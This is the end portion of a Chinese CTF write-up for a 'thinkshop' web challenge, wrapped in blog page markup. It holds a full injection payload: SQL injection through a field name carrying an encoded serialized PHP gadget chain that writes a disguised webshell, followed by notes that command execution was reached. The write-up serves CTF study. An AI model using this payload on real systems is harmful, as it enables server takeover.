+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2&amp;name=sss&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3dunhex(%2759546f784f6e74704f6a4137547a6f794e7a6f6964476870626d746363484a765932567a633178776158426c633178586157356b6233647a496a6f784f6e747a4f6a4d304f69494164476870626d746363484a765932567a633178776158426c633178586157356b6233647a41475a706247567a496a74684f6a453665326b364d4474504f6a45334f694a3061476c75613178746232526c6246785161585a76644349364e6a7037637a6f354f6949414b6742686348426c626d51694f3245364d54703761546f774f334d364f446f695a32563052584a79623349694f33317a4f6a67364967417141475679636d3979496a74504f6a49334f694a3061476c75613178746232526c624678795a57786864476c76626c784959584e50626d55694f6a4d3665334d364d5445364967417141474a70626d524264485279496a74684f6a493665326b364d44747a4f6a4936496d3576496a74704f6a4537637a6f7a4f6949784d6a4d694f33317a4f6a45314f6949414b67427a5a57786d556d567359585270623234694f3249364d44747a4f6a673649674171414846315a584a35496a74504f6a45304f694a3061476c756131786b596c785264575679655349364d547037637a6f344f6949414b6742746232526c62434937547a6f794d446f6964476870626d746359323975633239735a56785064585277645851694f6a493665334d364d6a67364967423061476c756131786a6232357a6232786c58453931644842316441426f5957356b624755694f3038364d7a4136496e526f6157357258484e6c63334e70623235635a484a70646d56795845316c62574e685932686c5a4349364d547037637a6f784d446f6941436f41614746755a47786c63694937547a6f794d7a6f6964476870626d74635932466a614756635a484a70646d567958455a70624755694f6a493665334d364d544136496741714147397764476c76626e4d694f3245364e547037637a6f324f694a6c65484270636d55694f326b364d44747a4f6a45794f694a6a59574e6f5a56397a64574a6b615849694f3249364d44747a4f6a5936496e42795a575a7065434937637a6f774f6949694f334d364e446f696347463061434937637a6f784d444d36496e426f63446f764c325a706248526c63693933636d6c305a54317a64484a70626d6375636d39304d544d76636d567a62335679593255394c335a6863693933643363766148527462433979645735306157316c4c33526c625841765044396a64574d675933566a646d467a596967704f334a70626e6b6f4a463955556b64626348707858536b37507a34694f334d364d544d36496d5268644746665932397463484a6c63334d694f3249364d447439637a6f324f6949414b674230595763694f3249364d54743966584d364f546f6941436f41633352356247567a496a74684f6a453665326b364d44747a4f6a6336496d646c64454630644849694f3331396658317a4f6a5936496e4268636d567564434937547a6f794d446f6964476870626d746359323975633239735a56785064585277645851694f6a493665334d364d6a67364967423061476c756131786a6232357a6232786c58453931644842316441426f5957356b624755694f3038364d7a4136496e526f6157357258484e6c63334e70623235635a484a70646d56795845316c62574e685932686c5a4349364d547037637a6f784d446f6941436f41614746755a47786c63694937547a6f794d7a6f6964476870626d74635932466a614756635a484a70646d567958455a70624755694f6a493665334d364d544136496741714147397764476c76626e4d694f3245364e547037637a6f324f694a6c65484270636d55694f326b364d44747a4f6a45794f694a6a59574e6f5a56397a64574a6b615849694f3249364d44747a4f6a5936496e42795a575a7065434937637a6f774f6949694f334d364e446f696347463061434937637a6f784d444d36496e426f63446f764c325a706248526c63693933636d6c305a54317a64484a70626d6375636d39304d544d76636d567a62335679593255394c335a6863693933643363766148527462433979645735306157316c4c33526c625841765044396a64574d675933566a646d467a596967704f334a70626e6b6f4a463955556b64626348707858536b37507a34694f334d364d544d36496d5268644746665932397463484a6c63334d694f3249364d447439637a6f324f6949414b674230595763694f3249364d54743966584d364f546f6941436f41633352356247567a496a74684f6a453665326b364d44747a4f6a6336496d646c64454630644849694f333139637a6f784e546f6941436f41633256735a6c4a6c6247463061573975496a74694f6a4137637a6f344f6949414b6742786457567965534937547a6f784e446f6964476870626d74635a474a635558566c636e6b694f6a453665334d364f446f6941436f416257396b5a5777694f3038364d6a4136496e526f6157357258474e76626e4e76624756635433563063485630496a6f794f6e747a4f6a49344f69494164476870626d746359323975633239735a5678506458527764585141614746755a47786c496a74504f6a4d774f694a3061476c756131787a5a584e7a615739755847527961585a6c636c784e5a57316a59574e6f5a5751694f6a453665334d364d5441364967417141476868626d52735a5849694f3038364d6a4d36496e526f6157357258474e685932686c5847527961585a6c636c78476157786c496a6f794f6e747a4f6a45774f6949414b674276634852706232357a496a74684f6a553665334d364e6a6f695a58687761584a6c496a74704f6a4137637a6f784d6a6f695932466a61475666633356695a476c79496a74694f6a4137637a6f324f694a77636d566d615867694f334d364d446f69496a747a4f6a5136496e4268644767694f334d364d54417a4f694a77614841364c79396d615778305a58497664334a7064475539633352796157356e4c6e4a766444457a4c334a6c63323931636d4e6c5053393259584976643364334c32683062577776636e567564476c745a5339305a5731774c7a772f5933566a49474e3159335a686332496f4b547479615735354b43526656464a4857334236635630704f7a382b496a747a4f6a457a4f694a6b5958526858324e76625842795a584e7a496a74694f6a413766584d364e6a6f6941436f416447466e496a74694f6a45376658317a4f6a6b364967417141484e306557786c6379493759546f784f6e74704f6a4137637a6f334f694a6e5a58524264485279496a74396658317a4f6a6736496741714147466859574668496a744f4f3331396658303d%27)/**/WHERE/**/`id`/**/%3d/**/1#=1 &amp;data=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165701575.png" alt="image-20231218165701575"></p>
+<p>看到这个说明反序列化成功</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165720197.png" alt="image-20231218165720197"></p>
+<p>最后就可以命令执行了</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165742506.png" alt="image-20231218165742506"></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/dashang.jpg" alt="Once 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Once 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/04/%5BBSidesTLV%202023%20CTF%5DMy%20Vouchers%20Repo/" rel="prev" title="My Vouchers Repo(BSidesTLV 2023 CTF)">
+      <i class="fa fa-chevron-left"></i> My Vouchers Repo(BSidesTLV 2023 CTF)
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#thinkshop"><span class="nav-number">1.</span> <span class="nav-text">thinkshop</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Once"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">Once</p>
+  <div class="site-description" itemprop="description">forever</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1410039666&auto=0&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer">
+   <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1410039666&auto=0&height=66">
+   </iframe>
+  </div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">world</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='' opacity='' zIndex='' count='' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'PZfVYAl8hrPpczg4EF7C05Rh-gzGzoHsz',
+      appKey     : 'cx8a6nD3cI8V4erQeXcAarYz',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
